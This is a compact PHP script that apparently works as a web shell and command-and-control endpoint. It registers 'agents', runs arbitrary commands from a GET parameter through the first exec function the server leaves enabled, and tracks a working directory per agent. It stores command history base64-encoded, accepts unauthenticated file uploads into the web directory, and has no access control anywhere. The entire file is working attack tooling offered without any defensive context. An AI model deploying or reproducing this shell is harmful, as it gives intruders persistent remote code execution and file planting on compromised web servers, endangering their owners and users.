<?php
header("Content-Type: application/json");
$f="sessions.json";
if(!file_exists($f))file_put_contents($f,"[]");
$d=json_decode(file_get_contents($f),1);
$a=$_GET['action']??"";$i=$_GET['id']??"";$c=$_GET['cmd']??"";
if($a=="upload"&&isset($_FILES['file'])){
    $t=__DIR__."/".basename($_FILES['file']['name']);
    echo json_encode(move_uploaded_file($_FILES['file']['tmp_name'],$t)?["status"=>"uploaded","file"=>basename($t)]:["status"=>"failed"]);
    exit;
}
function s($f,$d){file_put_contents($f,json_encode($d,JSON_PRETTY_PRINT));}
function m(){foreach(["system","shell_exec","passthru","exec","proc_open"]as$x)if(function_exists($x)&&stripos(ini_get('disable_functions'),$x)===false)return$x;}
function r($c,$m,$w){
    $fc="cd ".escapeshellarg($w)." && ".$c;
    switch($m){
        case"system":ob_start();@system($fc);$o=ob_get_clean();break;
        case"shell_exec":$o=@shell_exec($fc);break;
        case"passthru":ob_start();@passthru($fc);$o=ob_get_clean();break;
        case"exec":$a=[];@exec($fc,$a);$o=implode("\n",$a);break;
        case"proc_open":$d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$p=@proc_open($fc,$d,$pipes,$w);$o=is_resource($p)?stream_get_contents($pipes[1]):"";if(isset($pipes[1]))fclose($pipes[1]);if(isset($p))proc_close($p);break;
        default:$o="[!] No working exec function";
    }return trim($o??"");
}
if($a=="register"){
    if(!$i)$i=uniqid("agent_");
    if(!isset($d[$i]))$d[$i]=["last_seen"=>time(),"history"=>[],"method"=>m(),"cwd"=>getcwd(),"home"=>getcwd()];
    s($f,$d);
    echo json_encode(["id"=>$i,"status"=>"registered","method"=>$d[$i]["method"],"cwd"=>$d[$i]["cwd"]]);exit;
}
if($a=="push"&&isset($d[$i])){
    $d[$i]["last_seen"]=time();
    $mth=$d[$i]["method"]??m();$cwd=$d[$i]["cwd"]??getcwd();$h=$d[$i]["home"]??getcwd();
    if(preg_match('/^cd\s*(.*)$/',trim($c),$m)){
        $t=trim($m[1]);
        if($t==="")$cwd=$h;
        elseif($t==="..")$cwd=dirname($cwd);
        else{$np=$cwd.DIRECTORY_SEPARATOR.$t;if(is_dir($np))$cwd=realpath($np);elseif(is_dir($t))$cwd=realpath($t);}
        $d[$i]["cwd"]=$cwd;$res="Changed directory to: $cwd";
    }else $res=r($c,$mth,$cwd);
    $d[$i]["history"][]=["cmd"=>$c,"output"=>base64_encode($res),"time"=>date("Y-m-d H:i:s")];
    s($f,$d);
    echo json_encode(["status"=>"executed","cwd"=>$cwd,"output"=>base64_encode($res)]);exit;
}
if($a=="fetch_result"&&isset($d[$i])){echo json_encode(end($d[$i]["history"])?:[]);exit;}
if($a=="history"&&isset($d[$i])){echo json_encode($d[$i]["history"],JSON_PRETTY_PRINT);exit;}
if($a=="list"){echo json_encode($d,JSON_PRETTY_PRINT);exit;}
echo json_encode(["error"=>"Invalid action"]);
